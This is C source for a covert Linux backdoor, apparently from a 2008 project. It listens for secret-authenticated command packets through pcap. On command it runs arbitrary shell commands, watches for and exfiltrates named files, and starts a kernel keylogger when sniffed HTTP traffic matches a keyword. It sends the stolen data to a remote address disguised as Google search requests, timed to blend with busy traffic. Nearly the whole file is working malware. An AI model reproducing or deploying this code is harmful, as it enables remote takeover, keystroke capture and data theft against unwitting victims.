/*
 * Copyright (C) 2008 Stephen Makonin and Torin Sandall. All rights reserved. 
 */

#include <netinet/tcp.h>
#include <linux/input.h>
#include <pthread.h>

#include "common.h"
#include "pcspkr.h"
#include "util.h"
#include "google.h"
#include "queue.h"
#include "backdoor.h"

#define TS_HISTORY_LEN 100

static pthread_mutex_t keylog_mutex = PTHREAD_MUTEX_INITIALIZER;
static unsigned long timestamps[TS_HISTORY_LEN];
static unsigned int ntimestamps;
static queue *response_queue;
static int epfd;

static void sched_event_cleanup_cb(void *);
static int command_request_cb(void *);
static int file_notify_cb(void *);
static int dir_notify_cb(void *);
static int send_file_cb(void *);
static int send_buffer_cb(void *);
static int sniff_traffic_cb(void *);
static int arp_cb(void *);
static int icmp_cb(void *);
static void * keylog_proc(void *);

static void handle_timeout(void);
static int handle_exfil(const cmd_pkt *);
static int handle_keylog(const cmd_pkt *);

static buffer_node * buffer_node_alloc(void);
static file_node * file_node_alloc(void);
static sched_event * sched_event_alloc(void);
static int check_timestamp(unsigned long);
static int check_throughput(void);

int backdoor_init(unsigned int size, const char *filter, const char *dev)
{
	sched_event *cmdreq;
    sched_event *arp;
    sched_event *icmp;

	if((epfd = epoll_create(size)) < 0)
		return -1;
		
	cmdreq = sched_event_alloc();
	cmdreq->callback = command_request_cb;
	cmdreq->cleanup = sched_event_cleanup_cb;
    
    arp = sched_event_alloc();
    arp->callback = arp_cb;
    arp->cleanup = sched_event_cleanup_cb;
    
    icmp = sched_event_alloc();
    icmp->callback = icmp_cb;
    icmp->cleanup = sched_event_cleanup_cb;
    
	if((cmdreq->fd = pcap_create_selectable(filter, dev)) < 0) {
		free(cmdreq);
		return -1;
	}

	if((arp->fd = pcap_create_selectable("arp", dev)) < 0) {
		free(cmdreq);
		return -1;
	}

    if((icmp->fd = pcap_create_selectable("icmp", dev)) < 0) {
		free(cmdreq);
		return -1;
	}
	
	if(ep_add(epfd, EPOLLIN | EPOLLET, cmdreq->fd, cmdreq) != 0) {
		free(cmdreq);
		return -1;
	}

//	if(ep_add(epfd, EPOLLIN | EPOLLET, arp->fd, arp) != 0) {
//		free(cmdreq);
//		return -1;
//	}

//  if(ep_add(epfd, EPOLLIN | EPOLLET, icmp->fd, icmp) != 0) {
//  	free(cmdreq);
//		return -1;
//	}

	if((response_queue = queue_alloc()) == NULL) {
		free(cmdreq);
		return -1;
	}
		
	return 0;	
}

int backdoor_scheduler(unsigned int size)
{
	int ret;
	int i;
	sched_event *ptr;	
	struct epoll_event *ev;

	if((ev = (struct epoll_event *)malloc(sizeof(struct epoll_event) * size)) == NULL)
		return -1;

	for(;;) {
		if((ret = epoll_wait(epfd, ev, size, timeout)) < 0)
        {
			if(errno == EINTR)
            {
                continue;
            }

            return -1;
        }
		
		if(!ret) {
            handle_timeout();
			continue;
		}
		
		for(i = 0; i < ret; i++) {
			switch(ev[i].events) {
				case EPOLLIN:
					ptr = (sched_event *)ev[i].data.ptr;
					
					if(ptr->callback(ptr) != 0)
						ptr->cleanup(ptr);
									
					break;
			}
		}
	}
	
	return 0;
}

int handle_exfil(const cmd_pkt *pkt)
{
	int fd;
	
	if((fd = open(pkt->options, O_RDONLY)) < 0)
	{
		int watchfd;
        char dir[MAX_FILENAME_LEN];
		sched_event *ev;
		
		if(errno != ENOENT)
			return -1;
			
		if((watchfd = inotify_init()) < 0)
        {
            //dbg_print("%s: inotify_init has failed, errno=%d: %s", __FUNCTION__, errno, strerror(errno));
		    return -1;
        }

        strncpy(dir, pkt->options, rindex(pkt->options, '/') - pkt->options);
			
		if(inotify_add_watch(watchfd, dir, IN_CREATE) < 0)
		{
			if(errno != ENOENT)
			{
				//dbg_print("%s: inotify_add_watch failed, errno=%d, errstr=%s, filename=%s", __FUNCTION__, errno, strerror(errno), pkt->options);
				return -1;
			}
		}
			
        ev = sched_event_alloc();
		ev->ptr = (void *)pkt;
		ev->fd = watchfd;
		ev->callback = dir_notify_cb;
		ev->cleanup = sched_event_cleanup_cb;
	
		if(ep_add(epfd, EPOLLIN | EPOLLET, watchfd, (void *)ev) < 0)
			return -1;
	}
	else
	{
		//dbg_print("%s: looking for %s", __FUNCTION__, pkt->options);
        file_node *dat;

        dat = file_node_alloc();
        dat->pkt = (cmd_pkt *)pkt;
        dat->fd = fd;
        
		if(queue_push(response_queue, (void *)dat, sizeof(*dat), send_file_cb) < 0)
			return -1;		
	}
	
	return 0;
}

int handle_keylog(const cmd_pkt *pkt)
{
    int ret = 0;
    int pcap_fd;
    sched_event *ev;
    char eth_dev[8];
    
    find_active_eth(eth_dev);

    if((pcap_fd = pcap_create_selectable("(tcp port 80) && (tcp[13]=0x18)", eth_dev)) < 0)
    {
        //dbg_print("%s: pcap_create_selectable failed", __FUNCTION__);
        ret = -1;
        goto end_of_func;
    }

    //dbg_print("%s: created selectable pcap descriptor, pcap_fd=%d", __FUNCTION__, pcap_fd);
    ev = sched_event_alloc();
    //dbg_print("%s: created scheduler event, ev=%p", __FUNCTION__, ev);
    ev->fd = pcap_fd;
    ev->callback = sniff_traffic_cb;
    ev->cleanup = sched_event_cleanup_cb;
    ev->ptr = (void *)pkt;

    if(ep_add(epfd, EPOLLIN | EPOLLET, pcap_fd, (void *)ev) < 0)
    {
        //dbg_print("%s: ep_add failed", __FUNCTION__);
        ret = -1;
        close(pcap_fd);
        goto end_of_func;
    }

    //dbg_print("%s: added pcap_fd=%d to epfd=%d", __FUNCTION__, pcap_fd, epfd);

end_of_func:
    return ret;
}

typedef struct RESPONSE_THREAD_CTX response_thread_ctx;

struct RESPONSE_THREAD_CTX 
{
    void *data;
    ssize_t len;
    int (*callback)(void *);
};

void * response_thread_proc(void *ptr)
{
    response_thread_ctx *ctx = (response_thread_ctx *)ptr;
    ctx->callback(ctx->data);
    return ptr;
}

void handle_timeout()
{
    int i;
    int (*cb)(void *);
    void *data;
    unsigned short data_len;
    pthread_t th;

    if(check_throughput() < 0)
    {
        //dbg_print("%s: check_throughput returned non zero, not enough traffic", __FUNCTION__);
        return;
    }

    //dbg_print("%s: check_throughput succeeded, processing response queue", __FUNCTION__);

    for(i = 0; i < response_queue->nelem; i++)
    {
        if(queue_pop(response_queue, &data, &data_len, &cb) != FAIL)
        {
            response_thread_ctx ctx = { .data = data, .len = data_len, .callback = cb, };

            if(pthread_create(&th, NULL, response_thread_proc, &ctx) != 0)
            {
                //dbg_print("%s: pthread_create has failed, Error #%d, %s", __FUNCTION__, errno, strerror(errno));
            }
        }
    }
}

void sched_event_cleanup_cb(void *ptr)
{
	sched_event *tmp = (sched_event *)ptr;
	free(tmp->ptr);
	close(tmp->fd);
	free(tmp);
}

int command_request_cb(void *ptr)
{
	int nrecv;
	sched_event *ev = (sched_event *)ptr;
	cmd_pkt *pkt;
	
	if((nrecv = recv(ev->fd, ev->rdbuf, sizeof(ev->rdbuf), 0)) < 0)
    {
    	return -1;
    }
		
	if(nrecv < CMD_REQ_MIN_LEN)
    {
		return 0;
    }

    enc_stream_buffer(NULL, ev->rdbuf, nrecv);
	pkt = (cmd_pkt *)ev->rdbuf;
	pkt->timestamp = ntohl(pkt->timestamp);
	
	if(check_timestamp(pkt->timestamp) != 0)
    {
		return 0;
    }
	
    if(strncmp(pkt->secret, SECRET, 8))
    {
        return 0;
    }
		
	switch(pkt->opcode)
    {
		case CMD_REQ_OPCODE_EXFIL:
			handle_exfil(pkt);
			break;
			
		case CMD_REQ_OPCODE_KEYLOG:
            handle_keylog(pkt);
			break;
			
		case CMD_REQ_OPCODE_EXEC:
			system(pkt->options);
			break;
	};
	
	return 0;
}

int arp_cb(void *ptr _UNUSED)
{
    int ret = 0;
    return ret;
}

int icmp_cb(void *ptr _UNUSED)
{
    int ret = 0;
    return ret;
}

int dir_notify_cb(void *ptr)
{
    sched_event *event = (sched_event *)ptr;
    cmd_pkt *pkt = (cmd_pkt *)event->ptr;
    struct inotify_event *i_event;
    int rc = -1;
    int nread;
    int i = 0;
    int fd = event->fd;
    char *buffer = event->rdbuf;

    if((nread = read(fd, buffer, sizeof(event->rdbuf))) < 0)
    {
        //dbg_print("%s: read has failed, errno=%d:%s, fd=%d", __FUNCTION__, errno, strerror(errno), fd);
        return rc;
    }

    while(i < nread)
    {
        i_event = (struct inotify_event *)&buffer[i];

        if(i_event->mask & IN_CREATE)
        {
            char *filename = rindex(pkt->options, '/');

            filename++;

            if(!strcmp(i_event->name, filename))
            {
                sched_event *f_event = sched_event_alloc();

                f_event->fd = inotify_init();
                f_event->callback = file_notify_cb;
                f_event->cleanup = sched_event_cleanup_cb;
                f_event->ptr = (void *)pkt;

                if(inotify_add_watch(f_event->fd, pkt->options, IN_CLOSE_WRITE) < 0)
                {
                    //dbg_print("%s: inotify_add_watch has failed, errno=%d:%s, fd=%d", __FUNCTION__, errno, strerror(errno), f_event->fd);
                    return rc;
                }

                if(ep_add(epfd, EPOLLIN|EPOLLET, f_event->fd, f_event) < 0)
                {
                    //dbg_print("%s: epoll_add has failed, errno=%d:%s, epfd=%d, fd=%d", __FUNCTION__, errno, strerror(errno), epfd, fd);
                    return rc;
                }

                close(event->fd);
                free(event);
            }
        }

        i += sizeof(*i_event) + i_event->len;
    }

    rc = 0;

    return rc;
}

int file_notify_cb(void *ptr)
{
    int ret = 0;
    int nread = 0;
    int i = 0;
    sched_event *sched_ev = (sched_event *)ptr;
    cmd_pkt *pkt = (cmd_pkt *)sched_ev->ptr;
    struct inotify_event *inot_ev = NULL;

    //dbg_print("%s: ev=%p", __FUNCTION__, sched_ev);

    if((nread = read(sched_ev->fd, sched_ev->rdbuf, sizeof(sched_ev->rdbuf))) < 0)
    {
        //dbg_print("%s: read failed, ev=%p, fd=%d, errno=%d", __FUNCTION__, sched_ev, sched_ev->fd, errno);
        ret = -1;
        goto end_of_func;
    }

    //dbg_print("%s: read %d bytes from fd=%d", __FUNCTION__, nread, sched_ev->fd);

    while(i < nread)
    {
        inot_ev = (struct inotify_event *)&sched_ev->rdbuf[i];
        //dbg_print("%s: handling inotify event %p, mask=0x%08X", __FUNCTION__, inot_ev, inot_ev->mask);

        if(inot_ev->mask & IN_CLOSE_WRITE)
        {
            int fd;
            file_node *tmp;

            if((fd = open(pkt->options, O_RDONLY)) < 0)
            {
                //dbg_print("%s: failed to open %s, errno=%d:%s", __FUNCTION__, pkt->options, errno, strerror(errno));
                ret = -1;
                goto end_of_func;
            }

            tmp = file_node_alloc();
            tmp->pkt = pkt;
            tmp->fd = fd;
            
            if(queue_push(response_queue, (void *)tmp, sizeof(*tmp), send_file_cb) < 0)
            {
                //dbg_print("%s: failed to push new exfil node onto response queue, queue=%p, dat=%p", __FUNCTION__, response_queue, tmp);
                ret = -1;
                goto end_of_func;
            }

            //dbg_print("%s: pushed tmp=%p onto queue=%d", __FUNCTION__, tmp, response_queue);
            close(sched_ev->fd);
            free(sched_ev);
        }
        
        i += sizeof(struct inotify_event) + inot_ev->len;
    }

    //dbg_print("%s: leaving function, rc = %d", __FUNCTION__, ret);

end_of_func:
	return ret;
}

int send_buffer_cb(void *ptr)
{
    buffer_node *bn = (buffer_node *)ptr;
    int rc = -1;
    int fd = -1;
    int nwrite = -1;
    int i = 0;
    int bytes_left = 0;
    int bytes_to_write = 0;
    char request_buffer[MAX_REQUEST_LEN];
    google_session gs;

    if((fd = socket_create_tcp_c32(bn->pkt->addr, CLIENT_LISTENER_PORT)) < 0)
    {
        //dbg_print("%s: socket_create_tcp_c32 has failed, errno=%d:%s, addr=%p", __FUNCTION__, errno, strerror(errno), bn->pkt->addr);
        return rc;
    }

    srand(time(NULL));
    g_start_search_session(&gs);
    nwrite = socket_blk_write(fd, http_initial_get_request, strlen(http_initial_get_request));

    while(i < bn->len)
    {
        bytes_left = bn->len - i;
        bytes_to_write = bytes_left > MAX_PAYLOAD_LEN ? MAX_PAYLOAD_LEN : bytes_left;
        g_create_search_request(&gs, bn->buffer, bytes_to_write, request_buffer);
        nwrite = socket_blk_write(fd, request_buffer, strlen(request_buffer));
        i += bytes_to_write;
        sleep(1);
    }

    rc = 0;

    return rc;
}

int send_file_cb(void *ptr)
{
    file_node *fn = (file_node *)ptr;
    google_session gs;
    int fd;
    int ret = -1;
    int nread;
    char request_buf[MAX_REQUEST_LEN];
    char rdbuf[MAX_PAYLOAD_LEN];
    int nwrite;
    char sockbuf[BUFLEN];
    ssize_t sockbuflen = sizeof(sockbuf);

    if((fd = socket_create_tcp_c32(fn->pkt->addr, CLIENT_LISTENER_PORT)) < 0)
    {
        //dbg_print("%s: tcp_connect failed, couldn't get client socket", __FUNCTION__);
        goto end_of_func;
    }

    srand(time(NULL));
    g_start_search_session(&gs);
    nwrite = socket_blk_write(fd, http_initial_get_request, strlen(http_initial_get_request));
    //dbg_print("%s: wrote initial HTTP GET request to proxy (length=%d)", __FUNCTION__, nwrite);
    while((nread = read(fn->fd, rdbuf, sizeof(rdbuf))) > 0)
    {
        //dbg_print("%s: read %d bytes from file, encoding into request buffer now", __FUNCTION__, nread);
        g_create_search_request(&gs, rdbuf, nread, request_buf);
        nwrite = socket_blk_write(fd, request_buf, strlen(request_buf));
        //dbg_print("%s: wrote HTTP GET request to proxy (length=%d)", __FUNCTION__, nwrite);
        sockbuflen = sizeof(sockbuf);
        sleep(1);
    }
    
    g_create_search_request(&gs, NULL, 0, request_buf);
    nwrite = socket_blk_write(fd, request_buf, strlen(request_buf));
    //dbg_print("%s: wrote last HTTP GET request to proxy (length=%d)", __FUNCTION__, nwrite);
    ret = 0;

end_of_func:
    close(fd);
    close(fn->fd);
    free(fn);
	return ret;
}

int sniff_traffic_cb(void *ptr)
{
    int ret = 0;
    int nread;
    sched_event *sched_ev = (sched_event *)ptr;
    char *str = ((cmd_pkt *)sched_ev->ptr)->options;
    char *loc;
    pthread_t th;
    ssize_t offset;

    //dbg_print("%s: entered with ptr=%p", __FUNCTION__, ptr);

    if((nread = recv(sched_ev->fd, sched_ev->rdbuf, sizeof(sched_ev->rdbuf), 0)) < 0)
    {
        //dbg_print("%s: recv failed, sched_ev=%p, fd=%d, errno=%d", __FUNCTION__, sched_ev, sched_ev->fd, errno);
        ret = -1;
        goto end_of_func;
    }

    offset = ((struct tcphdr *)(sched_ev->rdbuf + sizeof(struct iphdr) + sizeof(struct ether_header)))->doff * 4;

    //dbg_print("%s: read %d bytes from pcap_fd=%d, checking for str=\"%s\"", __FUNCTION__, nread, sched_ev->fd, str);
    
    if((loc = strstr(sched_ev->rdbuf+sizeof(struct ether_header)+sizeof(struct iphdr)+offset, str)) != NULL)
    {
        if(!pthread_mutex_trylock(&keylog_mutex))
        {
            if((ret = pthread_create(&th, NULL, keylog_proc, sched_ev->ptr)) != 0)
            {
                //dbg_print("%s: failed on pthread_create, ret=%d", __FUNCTION__, ret);
                goto end_of_func;
            }

            //dbg_print("%s: created keylogging thread", __FUNCTION__);
        }
    }

end_of_func:
    return ret;
}

void * keylog_proc(void *ptr)
{ 
    FILE *fp = NULL;
    buffer_node *tmp; 
    char cmd[64];
    
    snprintf(cmd, sizeof(cmd), "echo \"%d\" > %s", KEYLOG_STATE_START, KB_PROC_LOCATION);
    system(cmd);
    sleep(KEYLOG_SPAN);  
    snprintf(cmd, sizeof(cmd), "echo \"%d\" > %s", KEYLOG_STATE_STOP, KB_PROC_LOCATION);
    system(cmd);

    tmp = buffer_node_alloc();    
    tmp->pkt = (cmd_pkt *)ptr;
    tmp->len = BUFLEN;

    if(!(fp = fopen(KB_PROC_LOCATION, "r" )))
        return NULL;
    
    fread(tmp->buffer, BUFLEN, 1, fp);
    tmp->len = strlen(tmp->buffer);
    fclose(fp); 
    snprintf(cmd, sizeof(cmd), "echo \"%d\" > %s", KEYLOG_STATE_CLEAR, KB_PROC_LOCATION);
    system(cmd);

    if(queue_push(response_queue, (void *)tmp, sizeof(*tmp), send_buffer_cb) < 0)
    {
        //dbg_print("%s: queue_push failed", __FUNCTION__);
    }
    
    return NULL;
}

int check_throughput()
{
    struct stat fattrib, lattrib;
    static time_t last_time;
    time_t cur_time;
    FILE *fp = NULL;
    char buf[1024] = "", dev[16] = "", *delim = NULL;
    long long total = 0, tx = 0 , rx = 0;
    static long long last_count = 0;
    int interval = 5, rate = 0, ret = -1;
    int pps_threshold = 10; // packets/second
    
    ///
    // using this to stop warnings until the vars get used
    //
    (void)interval;
    (void)fattrib;
    (void)lattrib;

    time(&cur_time);

    if((lstat("/proc/net/dev", &lattrib)) != 0)
    {
        goto fail; 
    }

    if(S_ISLNK(lattrib.st_mode))
    {
        goto fail;
    }

    if(!(fp = fopen("/proc/net/dev", "r" )))
    {
        goto fail;
    }
                 
    // read past headers
    if(!fgets(buf, sizeof(buf), fp))
    {
        goto fail;
    }

    if(!fgets(buf, sizeof(buf), fp))
    {
        goto fail;
    }

    total = 0;
    while(fgets(buf, sizeof(buf), fp))
    {
        delim = strchr(buf, ':');

        if(*(delim + 1) == ' ')
            sscanf(buf, "%s %*Lu %Lu %*lu %*lu %*lu %*lu %*lu %*lu %*Lu %Lu %*lu %*lu %*lu %*lu %*lu %*lu", dev, &rx, &tx);
        else
            sscanf(buf, "%s %Lu %*lu %*lu %*lu %*lu %*lu %*lu %*Lu %Lu %*lu %*lu %*lu %*lu %*lu %*lu", dev, &rx, &tx);
            
        total += rx + tx;
     }

    fclose(fp);
        
    if(last_count)
    {
        rate = (total - last_count) / (cur_time - last_time);
        ////dbg_print("%s: traffic is %d packets/second", __FUNCTION__, rate);
        if(rate >= pps_threshold)
            ret = 1;
    }

    last_count = total;
    last_time = cur_time;   
    return 0;

fail:
    if(fp != NULL)
    {
        fclose(fp);
    }

    return -1;
}

int find_active_eth(char *dev)
{
    struct stat fattrib, lattrib;
    FILE *fp = NULL;
    char buf[1024] = "";
    
    ///
    // using this to stop warnings until the vars get used
    //
    (void)fattrib;
    (void)lattrib;


    if((lstat("/proc/net/arp", &lattrib)) != 0)
    {
        goto fail; 
    }

    if(S_ISLNK(lattrib.st_mode))
    {
        goto fail;
    }

    if(!(fp = fopen("/proc/net/arp", "r" )))
    {
        goto fail;
    }
                 
    // read past headers
    if(!fgets(buf, sizeof(buf), fp))
    {
        goto fail;
    }

    if(!fgets(buf, sizeof(buf), fp))
    {
        goto fail;
    }
    sscanf(buf, "%*s %*s %*s %*s %*s %s", dev);

    fclose(fp);
    
    //dbg_print("%s: will listen on device %s", __FUNCTION__, dev);
          
    return 1;

fail:
    if(fp != NULL)
    {
        fclose(fp);
    }

    return -1;
}

int check_timestamp(unsigned long ts)
{
	unsigned int i;

	for(i = 0; i < ntimestamps; i++)
		if(timestamps[i] == ts)
			return -1;
	
	timestamps[ntimestamps % TS_HISTORY_LEN] = ts;
	ntimestamps++;
	return 0;
}

sched_event * sched_event_alloc()
{
	sched_event *ret = (sched_event *)calloc(1, sizeof(sched_event));
	
	if(ret == NULL)
    {
        //dbg_print("%s: calloc failed, errno=%d, errstr=%s", __FUNCTION__, errno, strerror(errno));
	    exit(1);
    }
		
	return ret;
}

buffer_node * buffer_node_alloc()
{
    buffer_node *ret = (buffer_node *)calloc(1, sizeof(buffer_node));

    if(ret == NULL)
    {
        //dbg_print("%s: calloc failed, errno=%d, errstr=%s", __FUNCTION__, errno, strerror(errno));
        exit(1);
    }

    return ret;
}

file_node * file_node_alloc()
{
    file_node *ret = (file_node *)calloc(1, sizeof(file_node));

   	if(ret == NULL)
    {
        //dbg_print("%s: calloc failed, errno=%d, errstr=%s", __FUNCTION__, errno, strerror(errno));
	    exit(1);
    }

    return ret;
}

